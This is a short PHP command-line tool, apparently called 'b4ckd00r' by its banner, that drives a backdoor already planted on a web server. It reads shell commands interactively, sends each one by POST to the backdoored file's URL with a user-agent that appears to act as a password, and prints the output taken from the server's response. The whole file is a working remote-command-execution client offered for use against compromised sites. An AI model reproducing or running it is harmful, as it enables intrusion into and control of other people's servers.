<?php 
error_reporting(0);

	function get_string_between($string, $start, $end)
{
    $string = ' ' . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function Injection($domain, $postparams)
{
		$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $domain);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postparams);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch,CURLOPT_USERAGENT,'SetYoupasswordhere');

    $resp = curl_exec ($ch);
    curl_close ($ch);
	$realdata = get_string_between($resp, '~','~');
	return $realdata;

}
	$myArr= array("url:", "post:");
    $u= getopt("",$myArr);
    $p=getopt("",$myArr);


    if (!is_array($myArr) ) {
        print "There was a problem reading in the options.\n\n";
        exit(1);
    }
    
if (getopt("h")) {
		
	echo"


							#Author  ~ Rony Das  												   
							#Version ~ 1.0 														   	
			#Usage :~ php $argv[0] -u http://example.com/yourbackdooredfile.php -p postdata    

";
	die();
}

if ($u["url"]=='' ||  $p["post"]=='') {
	echo 
	"\n\n            	Get options/Help ~ php $argv[0] -h\n\n";
	die();
}

echo 
"\e[0;32m
				 _    _  _       _       _  ___   ___       
				| |  | || |     | |     | |/ _ \ / _ \      
				| |__| || |_ ___| | ____| | | | | | | |_ __ 
				| '_ \__   _/ __| |/ / _` | | | | | | | '__|
				| |_) | | || (__|   < (_| | |_| | |_| | |   
				|_.__/  |_| \___|_|\_\__,_|\___/ \___/|_|   
				                                         - fb.com/r0ny.py
				 \e[0;37mGreetz: Dipendra ~ Abk Khan ~ Nasir Khan                                
                      

";
while (true) {
echo "\nSend Command-- ";
$handle 		= fopen('php://stdin', "r");
$command    	= trim(fgets($handle));
$url  			= $u["url"];
$post			= $p["post"]."=echo ~;$command;echo ~";
		  		  fclose($handle);
if ($command=='exit') {
break;
}
echo "\n\e[0;32mOutput -- \e[0;37m\n\n";
echo Injection($url,$post);
}


?> 
